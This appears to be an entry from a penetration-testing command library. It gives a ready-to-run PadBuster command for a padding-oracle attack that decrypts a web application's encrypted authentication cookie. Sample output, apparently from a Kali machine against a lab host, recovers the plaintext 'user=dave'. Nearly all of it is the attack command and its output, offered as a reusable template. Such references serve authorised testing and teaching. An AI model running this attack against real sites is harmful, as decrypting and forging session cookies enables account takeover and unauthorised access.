---
id: e0bcfe1b-e00f-4078-a584-9085b8155695
name: PadBuster Decrypting a Cookie into Plaintext
type: command
executor: bash
data: padbuster http://$TARGET_IP $COOKIE 8 -cookies $COOKIE_NAME=$COOKIE -encoding
  0
output: "root@kali:~# padbuster http://10.10.10.18 vUTZknJSU7A%2BJ02NeAP2MingCdt8ctB2\
  \ 8 --cookies 'auth=vUTZknJSU7A%2BJ02NeAP2MingCdt8ctB2' -encoding 0\n          \
  \                           \n+-------------------------------------------+\n| PadBuster\
  \ - v0.3.3                        |\n| Brian Holyfield - Gotham Digital Science\
  \  |\n| labs@gdssecurity.com                      |\n+-------------------------------------------+\n\
  \                                     \nINFO: The original request returned the\
  \ following\n[+] Status: 200\n[+] Location: N/A\n[+] Content Length: 978       \
  \                                             \n                               \
  \                                            \nINFO: Starting PadBuster Decrypt\
  \ Mode \n*** Starting Block 1 of 2 ***\n                                       \
  \                                    \nINFO: No error string was provided...starting\
  \ response analysis\n\n*** Response Analysis Complete ***                      \
  \                   \n\nThe following response signatures were returned:       \
  \    \n\n-------------------------------------------------------\nID#     Freq \
  \   Status  Length  Location\n-------------------------------------------------------\n\
  1       1       200     1133    N/A\n2 **    255     200     15      N/A\n-------------------------------------------------------\n\
  \nEnter an ID that matches the error condition\nNOTE: The ID# marked with ** is\
  \ recommended : 2\n...\n...\n-------------------------------------------------------\n\
  ** Finished ***\n\n[+] Decrypted value (ASCII): user=dave\n\n[+] Decrypted value\
  \ (HEX): 757365723D6461766507070707070707\n\n[+] Decrypted value (Base64): dXNlcj1kYXZlBwcHBwcHBw==\n\
  \n-------------------------------------------------------"
created_at: '2019-10-24T00:47:43.801674+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# PadBuster Decrypting a Cookie into Plaintext

```bash
padbuster http://$TARGET_IP $COOKIE 8 -cookies $COOKIE_NAME=$COOKIE -encoding 0
```

## Expected Output

```
root@kali:~# padbuster http://10.10.10.18 vUTZknJSU7A%2BJ02NeAP2MingCdt8ctB2 8 --cookies 'auth=vUTZknJSU7A%2BJ02NeAP2MingCdt8ctB2' -encoding 0
                                     
+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+
                                     
INFO: The original request returned the following
[+] Status: 200
[+] Location: N/A
[+] Content Length: 978                                                    
                                                                           
INFO: Starting PadBuster Decrypt Mode 
*** Starting Block 1 of 2 ***
                                                                           
INFO: No error string was provided...starting response analysis

*** Response Analysis Complete ***                                         

The following response signatures were returned:           

-------------------------------------------------------
ID#     Freq    Status  Length  Location
-------------------------------------------------------
1       1       200     1133    N/A
2 **    255     200     15      N/A
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID# marked with ** is recommended : 2
...
...
-------------------------------------------------------
** Finished ***

[+] Decrypted value (ASCII): user=dave

[+] Decrypted value (HEX): 757365723D6461766507070707070707

[+] Decrypted value (Base64): dXNlcj1kYXZlBwcHBwcHBw==

-------------------------------------------------------
```


